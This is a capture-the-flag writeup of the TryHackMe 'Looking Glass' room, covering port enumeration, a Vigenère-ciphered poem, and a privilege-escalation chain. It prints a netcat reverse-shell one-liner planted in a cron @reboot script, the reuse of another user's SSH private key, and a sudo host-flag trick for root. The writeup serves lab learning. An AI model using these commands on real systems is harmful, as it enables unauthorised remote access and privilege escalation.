---
title: Looking Glass
published: 2023-09-20
description: 'A writeup of the tryhackme room looking glass.'
image: ''
tags: [Tryhackme]
category: 'Writeups'
project: 'Tryhackme Writeups'
draft: false 
---
# Looking Glass Room Writeup

## Enumeration

```BASH
sudo nmap -oA nmap/lookingglass -sV -sC -sS -vv -T4 10.10.144.200
```

There are a lot of open ports...

```BASH
ORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9100/tcp  open  jetdirect? syn-ack ttl 61
9101/tcp  open  jetdirect? syn-ack ttl 61
9102/tcp  open  jetdirect? syn-ack ttl 61
9103/tcp  open  jetdirect? syn-ack ttl 61
13782/tcp open  ssh        syn-ack ttl 61 Dropbear sshd (protocol 2.0)
...
```

nmap claims most of the ports are running the same service as 13782. I could not find any CVEs or known exploits for these services. I tried connecting to the dropbear ports.

```BASH
ssh -oHostKeyAlgorithms=+ssh-rsa 10.10.144.200 -p 9876
Connection to 10.10.144.200 closed.
```

If you are doing this box, you may be refused connection to these ports as they offer the `ssh-rsa` encryption for ssh. This is deprecated and so your host will refuse, adding the flag as shown will solve this issue.

We get a message saying `lower`, so lets try a lower port. Even when we try the lowest port we get `lower`. The instructions are reversed. Bracket until you find the right service, you may also need to try port numbers which didn't appear in the nmap scan.

## Exploitation

When we do find the right service, we are given a challenge, it is a cipher version of a poem. We can see the title at the top `Jabberwocky`.  We need to decipher the text, I used [boxentriq](https://www.boxentriq.com/code-breaking/vigenere-cipher). After finding the secret, we get some credentials. ssh into port 22 with them.

The user flag is in jabberwock's home directory, it is reversed.

## Privilige Escalation

`sudo -l` reveals we can reboot the computer as root. This gives us a hint to look at `/etc/crontab`, indeed a script in our home directory is being run on reboot as the user tweedledum. 

```BASH
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

Edit `twasBrillig.sh` with the following:

```BASH
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $MY_IP 7777 >/tmp/f
```

This will give us a reverse shell for `tweedledum` (remember to start your nc listener). Run `sudo reboot` and after a minute we should have a shell for tweedledum. Let's stabilise the shell with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl Z
stty raw -echo; fg
enter
```

In tweedledum's directory we have a string of hex `humptydumpty.txt`. If we take the output to [cyberchef](https://cyberchef.org/) we can decode the text with `from hex` and there is a password at the end. This is for the user humptydumpty.

As user humptydumpty we have execute permissions on alice's home folder, this is odd. Let's see if we can see any interesting files. Note you will not be able to list the directory but you will be able to execute the files there with a little guess work.

```BASH
ls -la alice/.ssh/id_rsa
```

This reveals a private key that we can use to ssh in as `alice`. Create a key file on your attacker machine and add the private key info. Make sure to `chmod 600 keyfile` when you're done.

```BASH
ssh -o "IdentitiesOnly=yes" -i aliceKey alice@10.10.144.200
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ 
```

I ran a [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script earlier as humptydumpty and `alice` is able to run BASH as root on the host ssalg-gnikool.  

```BASH
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

This host is "looking-glass" reversed. Use the `-h` flag with the sudo command to specify host.

```BASH
sudo -h ssalg-gnikool /bin/bash
```

We are now root. The root flag is in the root directory (it's reversed).
